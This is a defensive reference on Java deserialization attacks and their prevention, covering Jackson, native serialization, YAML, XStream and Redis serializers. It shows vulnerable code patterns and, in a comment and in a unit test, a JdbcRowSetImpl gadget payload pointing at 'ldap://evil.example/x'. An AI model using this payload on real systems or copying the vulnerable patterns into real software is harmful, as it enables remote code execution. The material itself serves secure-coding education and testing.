# Deserialization Attacks Reference

## The Attack

A deserializer that lets the input choose which classes to instantiate hands the attacker every class on the classpath. Chains of ordinary library classes ("gadgets") turn that into remote code execution.

### Native Java serialization
```java
// VULNERABLE: untrusted bytes into ObjectInputStream
ObjectInputStream ois = new ObjectInputStream(userInputStream);
Object obj = ois.readObject();           // code runs during readObject, before any cast
```

### Jackson polymorphic typing
```java
// VULNERABLE: the JSON names the class
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping();            // also: activateDefaultTyping with a permissive validator
// {"@class":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://evil.example/x","autoCommit":true}

// VULNERABLE: same thing per field
@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)
private Object payload;
```

### Other entry points
- YAML (SnakeYAML tags such as `!!javax.script.ScriptEngineManager`), XStream XML
- Caches, sessions and queues that store Java-serialized or class-tagged objects (Redis, JMS, Kafka)
- RMI, JMX over RMI, Spring HTTP invoker

## Prevention

### Use data formats with a fixed target type
JSON bound to a concrete DTO class (`readValue(json, OrderDto.class)`) instantiates only that class and its declared field types. This is the default and it is safe; the problems start when typing is made dynamic.

### Jackson
```java
// Polymorphism by logical name, with the subtypes listed in code
@JsonTypeInfo(use = JsonTypeInfo.Id.NAME, property = "type")
@JsonSubTypes({
    @JsonSubTypes.Type(value = Dog.class, name = "dog"),
    @JsonSubTypes.Type(value = Cat.class, name = "cat")
})
public sealed interface Animal permits Dog, Cat { }
```
- Never `enableDefaultTyping()`, never `Id.CLASS` or `Id.MINIMAL_CLASS` on input you do not fully control.
- If default typing cannot be avoided, give it an allowlist: `BasicPolymorphicTypeValidator.builder().allowIfSubType("com.myapp.dto.").build()`.
- Jackson 3 (package `tools.jackson`, immutable mappers built with `JsonMapper.builder()`) keeps the same model: default typing is opt-in and takes a `PolymorphicTypeValidator`.

### Redis and other stores
`JdkSerializationRedisSerializer`, the `RedisTemplate` default, is native serialization. `GenericJackson2JsonRedisSerializer` created with its no-argument constructor is not the fix: it configures default typing and writes the class name into every value, so whoever can write to Redis chooses the class. Serialize to a declared type.

```java
@Bean
public RedisTemplate<String, CartDto> cartTemplate(RedisConnectionFactory factory) {
    RedisTemplate<String, CartDto> template = new RedisTemplate<>();
    template.setConnectionFactory(factory);
    template.setKeySerializer(StringRedisSerializer.UTF_8);
    template.setValueSerializer(new Jackson2JsonRedisSerializer<>(CartDto.class));   // one fixed type
    return template;
}
```
Spring Data Redis 4 (Jackson 3) names the typed serializer `JacksonJsonRedisSerializer`. For Spring Session and Spring Cache, configure a JSON serializer with a fixed type or an allowlisting validator the same way, and treat the store as untrusted input: restrict who can write to it.

### If Java serialization cannot be removed
Filter on an allowlist, with graph limits. List the JDK types your classes contain; a bare `com.myapp.dto.*;!*` rejects the `ArrayList` or `Integer` inside your own DTO.

```java
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "maxdepth=10;maxrefs=1000;maxarray=10000;maxbytes=1048576;"
    + "com.myapp.dto.*;java.lang.String;java.lang.Number;java.lang.Integer;java.lang.Long;java.util.ArrayList;!*");

ObjectInputStream ois = new ObjectInputStream(input);
ois.setObjectInputFilter(filter);
```
A process-wide default can be set with `-Djdk.serialFilter=...`.

### YAML and XStream
```java
Yaml yaml = new Yaml(new SafeConstructor(new LoaderOptions()));    // plain maps, lists and scalars only
```
SnakeYAML 2.x restricts arbitrary class tags by default, but state the constructor explicitly. XStream: allow only your types (`xstream.allowTypes(new Class[] { OrderDto.class })`) and keep it current.

### Reduce exposure
- Do not expose RMI or JMX to untrusted networks; remove HTTP invoker endpoints.
- Run dependency scanning (OWASP Dependency-Check, your SCA tool). Removing one gadget library does not make deserializing untrusted data safe; it removes one known chain.

## Testing

Assert that the mapper your application uses does not honour a class name in the input:

```java
@Test
void classNameInJsonIsTreatedAsData() throws Exception {
    Object value = objectMapper.readValue(
        "{\"@class\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://evil.example/x\"}",
        Object.class);

    assertThat(value).isInstanceOf(Map.class);        // a plain map; no class was instantiated
}
```
With default typing enabled this test fails: the mapper either tries to resolve the class or rejects the untyped shape. Add the same test for each serializer used for Redis, sessions and message queues.

## Quick Reference

| Do | Don't |
|----|-------|
| JSON bound to concrete DTO types | `ObjectInputStream` on untrusted bytes |
| `@JsonTypeInfo(use = NAME)` with listed subtypes | `enableDefaultTyping()`, `Id.CLASS` |
| Typed JSON serializer for Redis, sessions, queues | `JdkSerializationRedisSerializer`; default-typed `GenericJackson2JsonRedisSerializer` |
| `ObjectInputFilter` allowlist plus limits if native serialization stays | Denylist of known gadget classes |
| `SafeConstructor` for YAML, type allowlist for XStream | Default constructors on untrusted input |
